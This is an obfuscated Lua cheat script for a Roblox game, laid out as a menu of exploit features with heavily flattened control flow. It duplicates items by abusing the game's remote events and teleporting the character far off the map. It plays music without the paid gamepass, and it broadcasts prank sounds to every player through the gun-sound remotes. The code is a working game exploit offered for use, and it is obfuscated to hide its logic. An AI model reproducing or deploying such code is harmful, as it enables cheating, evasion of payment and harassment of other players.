													while true do
														if (FlatIdent_7D6F7 == 0) then
															FlatIdent_665A5 = 0;
															while true do
																if (FlatIdent_665A5 == 0) then
																	local FlatIdent_CFBE = 0;
																	while true do
																		if (0 == FlatIdent_CFBE) then
																			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																			return;
																		end
																	end
											...
											if (FlatIdent_97782 == 2) then
												...
												while true do
													...
													if (FlatIdent_9551F == 0) then
														if (duping == false) then
															local FlatIdent_748F7 = 0;
															while true do
																if (0 == FlatIdent_748F7) then
																	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																	return;
																end
															end
											...
											if (FlatIdent_97782 == 3) then
												game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
												game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
												repeat
													local FlatIdent_6EEAE = 0;
													local FlatIdent_65436;
													while true do
														if (FlatIdent_6EEAE == 0) then
															FlatIdent_65436 = 0;
															while true do
											...
											if (FlatIdent_97782 == 1) then
												local FlatIdent_19867 = 0;
												while true do
													if (FlatIdent_19867 == 0) then
														args = {
															[1] = "PickingTools",
															[2] = toolselcted
														};
				...
				Tab:AddDropdown({
					["Name"] = "Paper bag Fire Power:",
					["Default"] = "",
					["Options"] = {
						"Small Power Paper bag Fire",
						"Big Power Paper bag Fire",
						"Giant Power Paper bag Fire"
					},
					["Callback"] = function(Value)
						if (Value == "Small Power Paper bag Fire") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							wait();
							toolselcted = "PaperbagFire";
							dupeamot = 15;
							picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l");
							cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s");
							game:GetService("StarterGui"):SetCore("SendNotification", {
							...
							for m = 1, 2 do
								...
								local FlatIdent_287D3;
								while true do
									if (FlatIdent_B964 == 0) then
										FlatIdent_287D3 = 0;
										while true do
											if (FlatIdent_287D3 == 0) then
												task.wait();
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
												break;
											end
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										local FlatIdent_B4E2 = 0;
										while true do
											if (FlatIdent_B4E2 == 0) then
												toollllfoun2 = true;
												for basc, aijfw in pairs(toollel:GetDescendants()) do
													if (aijfw.Name == "Handle") then
												...
												for nana, jjsjsj in pairs(toollll:GetDescendants()) do
													if (jjsjsj.Name == "Handle") then
														...
														while true do
															...
															if (FlatIdent_3D6D2 == 2) then
																toollll.Parent = game.Players.LocalPlayer.Character;
																toolllffel = toollll;
																break;
															end
															if (FlatIdent_3D6D2 == 1) then
								...
								while true do
									...
									if (FlatIdent_973AE == 1) then
										...
										if (duping == false) then
											...
											local FlatIdent_7E61C;
											while true do
												if (FlatIdent_ED25 == 0) then
													FlatIdent_7E61C = 0;
													while true do
														if (FlatIdent_7E61C == 0) then
															game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
															return;
														end
													end
						...
						elseif (Value == "Big Power Paper bag Fire") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							for m = 1, 2 do
								local FlatIdent_4B862 = 0;
								while true do
									if (FlatIdent_4B862 == 0) then
										task.wait();
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
										break;
									end
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										local FlatIdent_796BD = 0;
										local FlatIdent_22102;
										while true do
											if (0 == FlatIdent_796BD) then
												FlatIdent_22102 = 0;
												while true do
																	...
																	if (0 == FlatIdent_5F8CC) then
																		...
																		while true do
																			...
																			if (FlatIdent_40D3A == 0) then
																				local FlatIdent_30130 = 0;
																				while true do
																					if (FlatIdent_30130 == 1) then
																						FlatIdent_40D3A = 1;
																						break;
																					end
																					if (FlatIdent_30130 == 0) then
																						toollll.Parent = game.Players.LocalPlayer.Character;
																						wait();
																						FlatIdent_30130 = 1;
																					end
							...
							for m = 1, dupeamot do
								...
								local FlatIdent_54D07;
								local args;
								while true do
									if (FlatIdent_5F01B == 1) then
										while true do
											if (FlatIdent_54D07 == 1) then
												picktoolremote:InvokeServer(unpack(args));
												game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
												if (duping == false) then
													local FlatIdent_53965 = 0;
													local FlatIdent_5F110;
													while true do
														if (FlatIdent_53965 == 0) then
															FlatIdent_5F110 = 0;
															while true do
											...
											if (FlatIdent_54D07 == 0) then
												local FlatIdent_70134 = 0;
												while true do
													if (2 == FlatIdent_70134) then
														FlatIdent_54D07 = 1;
														break;
													end
													...
													if (FlatIdent_70134 == 0) then
														if (duping == false) then
															local FlatIdent_B671 = 0;
															while true do
																if (FlatIdent_B671 == 0) then
																	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																	return;
																end
															end
							...
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_5F2D3 = 0;
									local gripPosIndex;
									local gripPos;
									while true do
										if (FlatIdent_5F2D3 == 0) then
											tool.Parent = game.Players.LocalPlayer.Character;
											gripPosIndex = math.min(i, #TablaGripPos);
											FlatIdent_5F2D3 = 1;
										end
										if (FlatIdent_5F2D3 == 1) then
											gripPos = TablaGripPos[gripPosIndex];
											if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
												tool.GripPos = gripPos;
											else
						...
						elseif (Value == "Giant Power Paper bag Fire") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							for m = 1, 2 do
								...
								local FlatIdent_AFC3;
								while true do
									if (FlatIdent_6E70E == 0) then
										FlatIdent_AFC3 = 0;
										while true do
											if (FlatIdent_AFC3 == 0) then
												task.wait();
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
												break;
											end
												...
												for basc, aijfw in pairs(toollel:GetDescendants()) do
													if (aijfw.Name == "Handle") then
														...
														while true do
															...
															if (FlatIdent_2FA4E == 1) then
																local FlatIdent_71335 = 0;
																while true do
																	if (FlatIdent_71335 == 0) then
																		toollel.Parent = game.Players.LocalPlayer.Character;
																		tollllahhhh = toollel;
																		FlatIdent_71335 = 1;
																	end
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										local FlatIdent_20457 = 0;
										local FlatIdent_4DA0F;
										while true do
											if (FlatIdent_20457 == 0) then
												FlatIdent_4DA0F = 0;
												while true do
													if (FlatIdent_4DA0F == 0) then
														toollllfoun = true;
														for nana, jjsjsj in pairs(toollll:GetDescendants()) do
															if (jjsjsj.Name == "Handle") then
																local FlatIdent_58899 = 0;
																while true do
																	if (FlatIdent_58899 == 2) then
																		toollll.Parent = game.Players.LocalPlayer.Character;
																		toolllffel = toollll;
																		break;
																	end
																	if (FlatIdent_58899 == 1) then
																		...
																		while true do
																			if (FlatIdent_8164 == 1) then
																				FlatIdent_58899 = 2;
																				break;
																			end
																			if (0 == FlatIdent_8164) then
																				jjsjsj.Name = "H⁥a⁥n⁥d⁥l⁥e";
																				toollll.Parent = game.Players.LocalPlayer.Backpack;
																				FlatIdent_8164 = 1;
																			end
							...
							if (toollllfoun == true) then
								...
								local FlatIdent_2ED78;
								while true do
									if (0 == FlatIdent_75E9D) then
										FlatIdent_2ED78 = 0;
										while true do
											if (FlatIdent_2ED78 == 0) then
							...
							wait(2);
							for m = 1, dupeamot do
								local FlatIdent_4F2B7 = 0;
								local FlatIdent_8B9DB;
								local args;
								while true do
									if (1 == FlatIdent_4F2B7) then
										while true do
											if (1 == FlatIdent_8B9DB) then
												local FlatIdent_3438 = 0;
												while true do
													if (FlatIdent_3438 == 1) then
														if (duping == false) then
															local FlatIdent_58C94 = 0;
															local FlatIdent_69CB5;
															while true do
																if (FlatIdent_58C94 == 0) then
																	FlatIdent_69CB5 = 0;
																	while true do
																		if (FlatIdent_69CB5 == 0) then
																			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																			return;
																		end
																	end
				...
				Section = Tab:AddSection({
					["Name"] = "Music ID: (Gamepass)"
				});
				Tab:AddLabel("Paste Id song");
				musicTextBox = Tab:AddTextbox({
					["Name"] = "Music ID",
					["Default"] = "",
					["TextDisappear"] = false,
					["Callback"] = function(value)
				...
				Tab:AddButton({
					["Name"] = "Play Music",
					["Description"] = "the Music Is only Car",
					["Callback"] = function()
				...
				Section = Tab:AddSection({
					["Name"] = "Scooter Music ID: (Gamepass)"
				});
				musicTextBox = Tab:AddTextbox({
					["Name"] = "Music ID (Vehicles without engine only)",
					["Default"] = "",
					["TextDisappear"] = false,
					["Callback"] = function(value)
						musicId = value;
				...
				Tab:AddButton({
					["Name"] = "Play Music",
					["Description"] = "The Music Is Only for Scooter",
					["Callback"] = function()
						if (musicId and (musicId ~= "")) then
							local FlatIdent_5F6EB = 0;
							local args;
							...
							game:GetService("StarterGui"):SetCore("SendNotification", {
								["Title"] = "Error",
								["Text"] = "Please enter a valid Music ID!"
							});
						end
					end
				});
				Section = Tab:AddSection({
					["Name"] = "House Music ID: (Gamepass)"
				});
				houseMusicTextBox = Tab:AddTextbox({
					["Name"] = "Music ID (Only For House)",
					["Default"] = "",
					["TextDisappear"] = false,
					["Callback"] = function(value)
						houseMusicId = value;
				...
				Tab:AddButton({
					["Name"] = "Play Music",
					["Description"] = "The Music Is Only for the House",
					["Callback"] = function()
						if (houseMusicId and (houseMusicId ~= "")) then
							local FlatIdent_4A88F = 0;
							local FlatIdent_C895;
							local args;
							while true do
								if (FlatIdent_4A88F == 1) then
									while true do
										if (FlatIdent_C895 == 0) then
											args = {
				...
				Section = Tab:AddSection({
					["Name"] = "Music FE Everyone hears it (SOO OP, NO GAMEPASS)"
				});
				local player = game.Players.LocalPlayer;
				local replicatedStorage = game:GetService("ReplicatedStorage");
				local function playSound(soundId)
					local FlatIdent_2EBC1 = 0;
					local FlatIdent_48D17;
					local volume;
					local sound;
					while true do
						if (FlatIdent_2EBC1 == 1) then
							...
							while true do
								...
								if (FlatIdent_48D17 == 1) then
									local FlatIdent_63222 = 0;
									while true do
										if (FlatIdent_63222 == 0) then
											sound = Instance.new("Sound");
											sound.SoundId = "rbxassetid://"   .. soundId ;
											FlatIdent_63222 = 1;
										end
										if (FlatIdent_63222 == 1) then
											FlatIdent_48D17 = 2;
											break;
										end
									end
								end
								if (FlatIdent_48D17 == 2) then
								...
								if (FlatIdent_48D17 == 3) then
									local FlatIdent_5D812 = 0;
									while true do
										if (0 == FlatIdent_5D812) then
											sound.Parent = player:WaitForChild("PlayerGui");
											sound:Play();
											FlatIdent_5D812 = 1;
										end
										if (1 == FlatIdent_5D812) then
											FlatIdent_48D17 = 4;
											break;
										end
									end
								end
								if (FlatIdent_48D17 == 4) then
									sound.Ended:Connect(function()
										sound:Destroy();
									end);
									replicatedStorage.RE:FindFirstChild("1Gu1nSound1s"):FireServer(workspace, soundId, 1);
									break;
								end
							end
							break;
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						...
						local soundIds;
						while true do
							if (0 == FlatIdent_313A3) then
								soundIds = {
									["Strange screams"] = 5710016194,
									["Laugh"] = 18260230947,
									["Taco Bell"] = 6832470734,
									["Let's Go"] = 6805535039,
									["Bomb"] = 7405939280,
									["Ahhh"] = 7772283448,
									["Stupid Laugh"] = 8449305114,
									["GET OUT!"] = 18900008907
								};
								if soundIds[Value] then
									playSound(soundIds[Value]);
								end
								break;
							end
						end
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						local FlatIdent_4D3BD = 0;
						local musicMap;
						local musicId;
						local replicatedStorage;
						while true do
							if (FlatIdent_4D3BD == 1) then
								local FlatIdent_10593 = 0;
								while true do
									if (FlatIdent_10593 == 0) then
										if  not musicId then
											return;
										end
										replicatedStorage = game:GetService("ReplicatedStorage");
									...
									if (1 == FlatIdent_10593) then
										FlatIdent_4D3BD = 2;
										break;
									end
								end
							end
							if (0 == FlatIdent_4D3BD) then
								...
								while true do
									...
									if (0 == FlatIdent_75324) then
										musicMap = {
											["Fortnite Boys"] = "7396017128",
											["Russian National Anthem"] = "9040163991",
											["Fur Elise"] = "1836283178",
											["Spooky Scary Skeleton"] = "15689450026",
											["Hagi Lagi"] = "14366983688",
											["RockStar"] = "15689449215",
											["Spongebob SquarePants"] = "2396797933",
											["SuicideBoyz"] = "7753335981",
											["Sphere"] = "7737617702",
											["Fnaf Meme"] = "1846746381"
										};
										musicId = musicMap[Value];
										FlatIdent_75324 = 1;
									end
								end
							end
							if (FlatIdent_4D3BD == 2) then
								...
								while true do
									...
									if (FlatIdent_3FF6 == 0) then
										replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer("CharacterSizeDown", 1);
										replicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer("SkateBoard");
										FlatIdent_3FF6 = 1;
									end
								end
							end
							if (FlatIdent_4D3BD == 3) then
								replicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer("PickingScooterMusicText", musicId);
				...
				Section = Tab:AddSection({
					["Name"] = "Music Gun ID (Sniper)"
				});
				Tab:AddButton({
					["Name"] = "Get Sniper (It is needed for playback)",
					["Callback"] = function()
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						if (Value == "Ahh") then
							...
							while true do
								...
								if (FlatIdent_5F055 == 1) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_58975 = 0;
										local FlatIdent_24080;
										local soundId;
										local volume;
										local sound;
										while true do
											if (2 == FlatIdent_58975) then
												while true do
													if (FlatIdent_24080 == 2) then
														local FlatIdent_554F2 = 0;
														while true do
															if (0 == FlatIdent_554F2) then
																sound.Volume = volume;
																sound.Looped = false;
																FlatIdent_554F2 = 1;
															end
													...
													if (FlatIdent_24080 == 0) then
														local FlatIdent_9464C = 0;
														while true do
															if (1 == FlatIdent_9464C) then
																FlatIdent_24080 = 1;
																break;
															end
															if (FlatIdent_9464C == 0) then
																soundId = 4888372697;
																volume = 0.1;
																FlatIdent_9464C = 1;
															end
						...
						elseif (Value == "Fortnite Battle Passs") then
							...
							while true do
								...
								if (1 == FlatIdent_81600) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_13490 = 0;
										local FlatIdent_3E3F0;
										local soundId;
										local volume;
										local sound;
										while true do
											if (FlatIdent_13490 == 2) then
												while true do
													if (FlatIdent_3E3F0 == 2) then
														local FlatIdent_504CD = 0;
														while true do
															if (FlatIdent_504CD == 0) then
																sound.Volume = volume;
																sound.Looped = false;
																FlatIdent_504CD = 1;
															end
															if (FlatIdent_504CD == 1) then
																FlatIdent_3E3F0 = 3;
																break;
															end
														end
													end
													if (FlatIdent_3E3F0 == 0) then
														local FlatIdent_1175E = 0;
														while true do
															if (FlatIdent_1175E == 1) then
																FlatIdent_3E3F0 = 1;
																break;
															end
															if (FlatIdent_1175E == 0) then
																soundId = 8835210928;
																volume = 0.1;
																FlatIdent_1175E = 1;
															end
													...
													if (FlatIdent_3E3F0 == 3) then
														local FlatIdent_20AB9 = 0;
														while true do
															if (FlatIdent_20AB9 == 0) then
																sound.Parent = player:WaitForChild("PlayerGui");
																sound:Play();
																FlatIdent_20AB9 = 1;
															end
													...
													if (FlatIdent_3E3F0 == 4) then
														sound.Ended:Connect(function()
															sound:Destroy();
														end);
														break;
													end
													if (FlatIdent_3E3F0 == 1) then
														sound = Instance.new("Sound");
														sound.SoundId = "rbxassetid://"   .. soundId ;
														FlatIdent_3E3F0 = 2;
													end
						...
						elseif (Value == "Its?!") then
							...
							while true do
								...
								if (1 == FlatIdent_38F20) then
									local FlatIdent_7D9F6 = 0;
									while true do
										if (FlatIdent_7D9F6 == 0) then
											sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
											if sniperHandle then
												local FlatIdent_5B431 = 0;
												local FlatIdent_874D3;
												local soundId;
												local volume;
												local sound;
												while true do
													if (FlatIdent_5B431 == 2) then
														while true do
															if (FlatIdent_874D3 == 4) then
																sound.Ended:Connect(function()
																	sound:Destroy();
																end);
																break;
															end
															if (FlatIdent_874D3 == 2) then
													...
													if (FlatIdent_5B431 == 1) then
														volume = nil;
														sound = nil;
														FlatIdent_5B431 = 2;
													end
													if (FlatIdent_5B431 == 0) then
														FlatIdent_874D3 = 0;
														soundId = nil;
														FlatIdent_5B431 = 1;
													end
						...
						elseif (Value == "Your Bell At 6") then
							local FlatIdent_6617B = 0;
							local player;
							local character;
							local sniperHandle;
							...
							while true do
								if (FlatIdent_6617B == 1) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_706F1 = 0;
										local FlatIdent_774F6;
										local soundId;
										local volume;
										local sound;
										while true do
											if (FlatIdent_706F1 == 1) then
												volume = nil;
												sound = nil;
												FlatIdent_706F1 = 2;
											end
											if (FlatIdent_706F1 == 0) then
												FlatIdent_774F6 = 0;
												soundId = nil;
												FlatIdent_706F1 = 1;
											end
											if (FlatIdent_706F1 == 2) then
												while true do
													if (FlatIdent_774F6 == 0) then
														soundId = 4203251375;
														volume = 0.1;
														FlatIdent_774F6 = 1;
													end
													if (FlatIdent_774F6 == 1) then
														local FlatIdent_5D994 = 0;
														while true do
															if (FlatIdent_5D994 == 1) then
																FlatIdent_774F6 = 2;
																break;
															end
													...
													if (FlatIdent_774F6 == 2) then
														local FlatIdent_76268 = 0;
														while true do
															if (1 == FlatIdent_76268) then
																FlatIdent_774F6 = 3;
																break;
															end
															if (FlatIdent_76268 == 0) then
																sound.Volume = volume;
																sound.Looped = false;
																FlatIdent_76268 = 1;
															end
													...
													if (4 == FlatIdent_774F6) then
														sound.Ended:Connect(function()
															sound:Destroy();
														end);
														break;
													end
													if (FlatIdent_774F6 == 3) then
								...
								if (FlatIdent_6617B == 0) then
									local FlatIdent_3194F = 0;
									while true do
										if (1 == FlatIdent_3194F) then
											FlatIdent_6617B = 1;
											break;
										end
										if (FlatIdent_3194F == 0) then
											player = game.Players.LocalPlayer;
											character = player.Character or player.CharacterAdded:Wait() ;
											FlatIdent_3194F = 1;
										end
						...
						elseif (Value == "OooF") then
							local FlatIdent_874A4 = 0;
							local player;
							local character;
							local sniperHandle;
							local args;
							while true do
								if (FlatIdent_874A4 == 0) then
									player = game.Players.LocalPlayer;
									character = player.Character or player.CharacterAdded:Wait() ;
									FlatIdent_874A4 = 1;
								end
								if (1 == FlatIdent_874A4) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_86C2A = 0;
										local FlatIdent_15D8C;
										local soundId;
										local volume;
										local sound;
										while true do
											if (FlatIdent_86C2A == 2) then
												while true do
													if (3 == FlatIdent_15D8C) then
						...
						elseif (Value == "MuHAHaha") then
							...
							while true do
								if (FlatIdent_88E94 == 1) then
									local FlatIdent_6B148 = 0;
									while true do
										if (FlatIdent_6B148 == 1) then
											FlatIdent_88E94 = 2;
											break;
										end
										if (0 == FlatIdent_6B148) then
											sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
											if sniperHandle then
								...
								if (FlatIdent_88E94 == 0) then
									local FlatIdent_302C = 0;
									while true do
										if (FlatIdent_302C == 1) then
											FlatIdent_88E94 = 1;
											break;
										end
										if (FlatIdent_302C == 0) then
											player = game.Players.LocalPlayer;
											character = player.Character or player.CharacterAdded:Wait() ;
											FlatIdent_302C = 1;
										end
						...
						elseif (Value == "Pipe") then
							local FlatIdent_14F5D = 0;
							local player;
							local character;
							local sniperHandle;
							local args;
							while true do
								if (0 == FlatIdent_14F5D) then
									local FlatIdent_2ACDD = 0;
									while true do
										...
										if (1 == FlatIdent_2ACDD) then
											FlatIdent_14F5D = 1;
											break;
										end
									end
								end
								if (FlatIdent_14F5D == 2) then
									args = {
										[1] = game:GetService("Players").LocalPlayer.Character.Sniper.Handle,
										[2] = 6729922069,
										[3] = 1
								...
								if (FlatIdent_14F5D == 1) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_97B20 = 0;
										local soundId;
										local volume;
										local sound;
										while true do
											if (1 == FlatIdent_97B20) then
												sound = Instance.new("Sound");
												sound.SoundId = "rbxassetid://"   .. soundId ;
												FlatIdent_97B20 = 2;
											end
											if (FlatIdent_97B20 == 0) then
											...
											if (FlatIdent_97B20 == 4) then
												sound.Ended:Connect(function()
													sound:Destroy();
												end);
												break;
											end
											if (FlatIdent_97B20 == 2) then
												...
												while true do
													...
													if (FlatIdent_61AC4 == 1) then
														FlatIdent_97B20 = 3;
														break;
													end
												end
											end
											if (FlatIdent_97B20 == 3) then
												local FlatIdent_598E7 = 0;
												while true do
													if (FlatIdent_598E7 == 1) then
														FlatIdent_97B20 = 4;
														break;
													end
													if (FlatIdent_598E7 == 0) then
														sound.Parent = player:WaitForChild("PlayerGui");
														sound:Play();
														FlatIdent_598E7 = 1;
													end
						...
						elseif (Value == "Minecraft XP") then
							local FlatIdent_5AE7A = 0;
							local player;
							local character;
							local sniperHandle;
										...
										if (FlatIdent_2FF4C == 0) then
											...
											if sniperHandle then
												...
												while true do
													...
													if (1 == FlatIdent_10A9E) then
														local FlatIdent_98A5C = 0;
														while true do
															if (FlatIdent_98A5C == 0) then
																sound = Instance.new("Sound");
																sound.SoundId = "rbxassetid://"   .. soundId ;
																FlatIdent_98A5C = 1;
															end
															if (FlatIdent_98A5C == 1) then
																FlatIdent_10A9E = 2;
																break;
															end
														end
						...
						elseif (Value == "Hm -_?") then
							...
							local args;
							while true do
								if (1 == FlatIdent_61FD7) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_64ADD = 0;
										local FlatIdent_60790;
										local soundId;
										local volume;
										local sound;
										while true do
											if (FlatIdent_64ADD == 1) then
												volume = nil;
												sound = nil;
												FlatIdent_64ADD = 2;
											end
											if (FlatIdent_64ADD == 0) then
												FlatIdent_60790 = 0;
												soundId = nil;
												FlatIdent_64ADD = 1;
											end
											if (FlatIdent_64ADD == 2) then
												while true do
						...
						elseif (Value == "Wet Fart") then
							local FlatIdent_76301 = 0;
							local player;
							local character;
							local sniperHandle;
							local args;
							while true do
								if (FlatIdent_76301 == 1) then
										...
										if (FlatIdent_8FC3F == 0) then
											...
											if sniperHandle then
												...
												while true do
													...
													if (FlatIdent_2A917 == 1) then
														local FlatIdent_5FA3F = 0;
														while true do
															if (FlatIdent_5FA3F == 0) then
																sound = Instance.new("Sound");
																sound.SoundId = "rbxassetid://"   .. soundId ;
																FlatIdent_5FA3F = 1;
															end
															if (FlatIdent_5FA3F == 1) then
																FlatIdent_2A917 = 2;
																break;
															end
														end
													...
													if (FlatIdent_2A917 == 0) then
														local FlatIdent_817B6 = 0;
														while true do
															if (FlatIdent_817B6 == 1) then
																FlatIdent_2A917 = 1;
																break;
															end
															if (FlatIdent_817B6 == 0) then
																soundId = 6445594239;
																volume = 0.1;
																FlatIdent_817B6 = 1;
															end
								...
								if (FlatIdent_76301 == 0) then
									local FlatIdent_8BA68 = 0;
									while true do
										if (1 == FlatIdent_8BA68) then
											FlatIdent_76301 = 1;
											break;
										end
						...
						elseif (Value == "AHHHHHH") then
							...
							while true do
								if (FlatIdent_76149 == 1) then
									local FlatIdent_54376 = 0;
									while true do
										if (FlatIdent_54376 == 1) then
											FlatIdent_76149 = 2;
											break;
										end
										if (FlatIdent_54376 == 0) then
											sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
											if sniperHandle then
												...
												while true do
													if (FlatIdent_5B2BC == 0) then
														...
														while true do
															if (FlatIdent_5EBF2 == 1) then
																FlatIdent_5B2BC = 1;
																break;
															end
															if (FlatIdent_5EBF2 == 0) then
																soundId = 7772283448;
																volume = 0.1;
																FlatIdent_5EBF2 = 1;
															end
								...
								if (FlatIdent_76149 == 0) then
									local FlatIdent_785DD = 0;
									while true do
										if (FlatIdent_785DD == 0) then
											player = game.Players.LocalPlayer;
											character = player.Character or player.CharacterAdded:Wait() ;
											FlatIdent_785DD = 1;
										end
										if (FlatIdent_785DD == 1) then
											FlatIdent_76149 = 1;
											break;
										end
									end
								end
								if (FlatIdent_76149 == 2) then
									args = {
										[1] = game:GetService("Players").LocalPlayer.Character.Sniper.Handle,
										[2] = 7772283448,
										[3] = 1
						...
						elseif (Value == "OoOoOOO") then
							...
							while true do
								...
								if (FlatIdent_5F455 == 1) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_FDE1 = 0;
										local soundId;
										local volume;
										local sound;
										while true do
											if (3 == FlatIdent_FDE1) then
											...
											if (FlatIdent_FDE1 == 0) then
												soundId = 9084006093;
												volume = 0.1;
												FlatIdent_FDE1 = 1;
											end
											if (FlatIdent_FDE1 == 4) then
												sound.Ended:Connect(function()
													sound:Destroy();
												end);
												break;
						...
						elseif (Value == "Lick") then
							...
							while true do
								...
								if (FlatIdent_7E634 == 1) then
									local FlatIdent_56AB0 = 0;
									while true do
										if (FlatIdent_56AB0 == 1) then
											FlatIdent_7E634 = 2;
											break;
										end
										if (FlatIdent_56AB0 == 0) then
											sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
											if sniperHandle then
												local FlatIdent_13242 = 0;
												local soundId;
												local volume;
												local sound;
												while true do
													if (FlatIdent_13242 == 2) then
														sound.Volume = volume;
														sound.Looped = false;
														FlatIdent_13242 = 3;
													end
													if (4 == FlatIdent_13242) then
														sound.Ended:Connect(function()
															sound:Destroy();
														end);
														break;
													end
													if (FlatIdent_13242 == 1) then
														sound = Instance.new("Sound");
														sound.SoundId = "rbxassetid://"   .. soundId ;
														FlatIdent_13242 = 2;
													end
													if (FlatIdent_13242 == 3) then
						...
						elseif (Value == "Bro watch your Jet") then
							local FlatIdent_18B65 = 0;
							local player;
							local character;
							local sniperHandle;
							...
							while true do
								if (FlatIdent_18B65 == 0) then
									local FlatIdent_1AA4F = 0;
									while true do
										if (0 == FlatIdent_1AA4F) then
											player = game.Players.LocalPlayer;
											character = player.Character or player.CharacterAdded:Wait() ;
											FlatIdent_1AA4F = 1;
										end
										if (FlatIdent_1AA4F == 1) then
											FlatIdent_18B65 = 1;
											break;
										end
									end
									...
									while true do
										if (FlatIdent_62396 == 0) then
											...
											if sniperHandle then
												...
												local FlatIdent_5B6C2;
												local soundId;
												local volume;
												local sound;
												while true do
													if (FlatIdent_2655D == 1) then
														volume = nil;
														sound = nil;
														FlatIdent_2655D = 2;
													end
													if (FlatIdent_2655D == 2) then
														while true do
															if (FlatIdent_5B6C2 == 0) then
															...
															if (FlatIdent_5B6C2 == 4) then
																sound.Ended:Connect(function()
																	sound:Destroy();
																end);
																break;
															end
															if (2 == FlatIdent_5B6C2) then
																local FlatIdent_96C32 = 0;
																while true do
																	if (FlatIdent_96C32 == 0) then
																		sound.Volume = volume;
																		sound.Looped = false;
																		FlatIdent_96C32 = 1;
																	end
																	if (FlatIdent_96C32 == 1) then
																		FlatIdent_5B6C2 = 3;
																		break;
																	end
																end
															end
															if (FlatIdent_5B6C2 == 1) then
																local FlatIdent_86D54 = 0;
																while true do
																	if (FlatIdent_86D54 == 0) then
																		sound = Instance.new("Sound");
																		sound.SoundId = "rbxassetid://"   .. soundId ;
																		FlatIdent_86D54 = 1;
																	end
																	if (1 == FlatIdent_86D54) then
																		FlatIdent_5B6C2 = 2;
																		break;
																	end
																end
															end
															if (FlatIdent_5B6C2 == 3) then
																sound.Parent = player:WaitForChild("PlayerGui");
																sound:Play();
																FlatIdent_5B6C2 = 4;
															end
						...
						elseif (Value == "BRUHH") then
							...
							while true do
								...
								if (FlatIdent_48817 == 1) then
									sniperHandle = character:FindFirstChild("Sniper") and character.Sniper:FindFirstChild("Handle") ;
									if sniperHandle then
										local FlatIdent_4E1AB = 0;
										local soundId;
										local volume;
										local sound;
										while true do
											if (FlatIdent_4E1AB == 4) then
												sound.Ended:Connect(function()
													sound:Destroy();
												end);
												break;
											end
											if (FlatIdent_4E1AB == 3) then
												local FlatIdent_91ED6 = 0;
												while true do
													if (FlatIdent_91ED6 == 1) then
														FlatIdent_4E1AB = 4;
														break;
													end
													if (FlatIdent_91ED6 == 0) then
